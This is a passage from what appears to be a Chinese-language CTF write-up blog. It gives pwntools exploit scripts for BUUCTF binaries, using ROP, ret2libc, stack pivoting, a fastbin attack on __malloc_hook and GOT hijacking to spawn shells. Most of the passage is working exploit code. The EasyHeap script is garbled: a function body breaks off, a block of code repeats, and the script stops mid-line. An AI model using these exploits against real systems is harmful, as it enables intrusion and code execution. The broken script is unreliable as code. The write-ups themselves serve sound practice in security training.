class="hljs-number">0x28</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-s-3">ciscn_2019_s_3</h3><p>这题感觉好难= =</p><p>#用59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget-__libc_csu_init。</p><p>#前面部分都是一样的，后面改成rop去开shell</p><p>#r13的值会给到rdx；让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码；我们可以调到后面的rop执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27416</span>)<br>main=<span class="hljs-number">0x0004004ED</span><br>execv=<span class="hljs-number">0x04004E2</span><br>pop_rdi=<span class="hljs-number">0x4005a3</span><br>pop_rbx_rbp_r12_r13_r14_r15=<span class="hljs-number">0x40059A</span><br>mov_rdxr13_call=<span class="hljs-number">0x0400580</span> <br>sys=<span class="hljs-number">0x00400517</span><br>pl1=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">8</span>+p64(main)<br>io.send(pl1)<br>io.recv(<span class="hljs-number">0x20</span>)<br>sh=u64(io.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">280</span><br>pl2=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">8</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="hljs-number">0</span>)\*<span class="hljs-number">2</span>+p64(sh+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>pl2+=p64(mov_rdxr13_call)+p64(execv)<br>pl2+=p64(pop_rdi)+p64(sh)+p64(sys)<br>io.send(pl2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="others-shellcode">others_shellcode</h3><p>直接nc连一下，cat flag就行</p><h3 id="HarekazeCTF2019-baby-rop2">[HarekazeCTF2019]baby_rop2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#这题就是用printf函数时，要有个形式参数%s，</span><br><br><span class="hljs-comment">#还有就是接收值的时候，接收的地址中间的某个字节为0，printf输出的就是不完整的地址，会导致错误</span><br><br><span class="hljs-comment">#剩下的就是标准ret2libc</span><br><br>pop_rdi=<span class="hljs-number">0x0000000000400733</span> <span class="hljs-comment"># pop rdi ; ret</span><br>pop_rsi_r15 = <span class="hljs-number">0x0000000000400731</span><br>format_str = <span class="hljs-number">0x0000000000400770</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])+p64(<span class="hljs-number">0</span>)+p64(elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>r.recvuntil(<span class="hljs-string">&#x27;name? &#x27;</span>)<br>r.sendline(payload)<br>true=u64(r.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(true)<br>binsh=<span class="hljs-number">0x18cd57</span><br>base=true-libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>pd2=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(binsh+base)+p64(system)<br>r.sendline(pd2)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>4.ez_pz_hackover_2016</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#这题直接告诉了栈的地址，还没开nx</span><br><br><span class="hljs-comment">#要找到输入的数据在栈中的偏移</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25044</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r.recvuntil(<span class="hljs-string">&#x27;crash: &#x27;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">10</span>), <span class="hljs-number">16</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>payload = <span class="hljs-string">&#x27;crashme\x00&#x27;</span> <br>payload = payload.ljust(<span class="hljs-number">26</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>payload += p32(stack_addr-<span class="hljs-number">0x1C</span>)<br>payload += asm(shellcraft.sh())<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="Black-Watch-入群题-PWN">[Black Watch 入群题]PWN</h3><p>栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26380</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./spwn&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>pd1=<span class="hljs-string">&#x27;aaaa&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>pd1+=p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">4</span>)<br>r.send(pd1)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(<span class="hljs-number">0x0804A300</span>)+p32(<span class="hljs-number">0x08048408</span>))<br>r.recvuntil(<span class="hljs-string">&#x27;say?&#x27;</span>)<br>true=<span class="hljs-built_in">int</span>(u32(r.recv(<span class="hljs-number">4</span>)))<br>base=true-<span class="hljs-number">0xd43c0</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(true)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>binsh=<span class="hljs-number">0x15902b</span><br>system=<span class="hljs-number">0x0003a940</span><br>pd2=<span class="hljs-string">&#x27;aaaa&#x27;</span>+p32(base+system)+p32(<span class="hljs-number">0</span>)+p32(binsh+base)<br>r.recvuntil(<span class="hljs-string">&#x27;name?&#x27;</span>)<br>r.send(pd2)<br>r.recvuntil(<span class="hljs-string">&#x27;say?&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(<span class="hljs-number">0x0804A300</span>)+p32(<span class="hljs-number">0x08048408</span>))<br>r.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="大一下">大一下</h2><h3 id="babyheap-0ctf-2017">babyheap_0ctf_2017</h3><p>思路：</p><p>1.运用堆溢出，伪造一个包含index1，2大小的在unsortbin大小范围的块，free到unsortbin，然后申请其原来index1大小的块，main_arena附近的地址就会下移到index2的块，地址就能被dump出来。泄露了main_arena附近的地址</p><p>2.libc基址=main_arena附近的地址-对应偏移-0x10</p><p>malloc_hook=libc基址+libc.sym[‘__malloc_hook’]</p><p>​shell=libc基址+one_gadget</p><p>3.用堆溢出修改free的fastbin块，在fastbin中制造虚假的链指向malloc_hook-0x23处</p><p>再分配两次0x60的块，第二次就分配在malloc_hook-0x23处</p><p>​在这个块上填入shell</p><p>​（任意地址写入任意值）</p><p>最后alloc带动malloc,malloc触发malloc_hook，hook带动shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./babyheap_0ctf_2017&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/2.23/libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25542</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------------------------------------------</span><br><br>alloc(<span class="hljs-number">0x10</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>alloc(<span class="hljs-number">0x10</span>) <br>alloc(<span class="hljs-number">0x10</span>) <br>fill(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x91</span>)) <br>free(<span class="hljs-number">1</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>dump(<span class="hljs-number">2</span>) <br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:]) <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr) <br>libc_base=addr-<span class="hljs-number">88</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x10</span> <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base) <br>hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] <br>shell=libc_base+o_g_old[<span class="hljs-number">1</span>] <br><span class="hljs-comment">#------------------------------------------------------- </span><br>free(<span class="hljs-number">1</span>) <br>fill(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(hook-<span class="hljs-number">0x23</span>)) <br>alloc(<span class="hljs-number">0x60</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>fill(<span class="hljs-number">4</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(shell)) <br>alloc(<span class="hljs-number">0x20</span>) <br><span class="hljs-comment">#gdb.attach(r) </span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>chunk大小60好像也要固定</p><p>hook-0x23，首先起码要-0x10，其次最近的7f就是再-0x13处了</p><h3 id="pwn2-sctf-2016">pwn2_sctf_2016</h3><p>思路：这里利用了有符号负数，转无符号数，变成极大值，绕过大小检测</p><p>然后return2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27335</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn2_sctf_2016&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;me to read? &#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>s=<span class="hljs-number">0x080486f8</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;printf&#x27;</span>])+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])+p32(s)+p32(elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>])<br>r.sendlineafter(<span class="hljs-string">&#x27;data!&#x27;</span>,payload)<br>r.recvuntil(<span class="hljs-string">&#x27;You said: &#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;You said: &#x27;</span>)<br>printf=u32(r.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(printf)<br>base=printf-libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x15902b</span><br><span class="hljs-comment">#------------------------------------------------------------</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])+p32(binsh)<br>r.sendlineafter(<span class="hljs-string">&#x27;me to read? &#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;data!&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ZJCTF-2019-EasyHeap">[ZJCTF 2019]EasyHeap</h3><p>这题got表可写，pie也没开，没show函数，考虑got劫持。</p><p>首先题目中那个函数目录错了，cat不了flag。</p><p>思路：堆溢出，分配chunk到magic地址附近，因为这题magic在heaparray附近，而heaparray指向chunk，溢出覆盖使其指向free_got，而该chunk则改为system_plt，微调位置，size大小0x7f绕过fastbin的检测。</p><p>改写一个chunk写成binsh。</p><p>free有binsh的那个块，把binsh作为参数带给free（其实是system）</p><p>最后的效果是：</p><p>free（1），实际是system（/bin/sh）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./easyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/2.23/libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29503</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>     sla(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br><br>sla(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#----------------------------------------------------------</span><br>magic=<span class="hljs-number">0x06020C0</span><br>create(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)     <span class="hljs-comment">#index0</span><br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)     <span class="hljs-comment">#index1</span><br>create(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)     <span class="hljs-comment">#index2</span><br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span 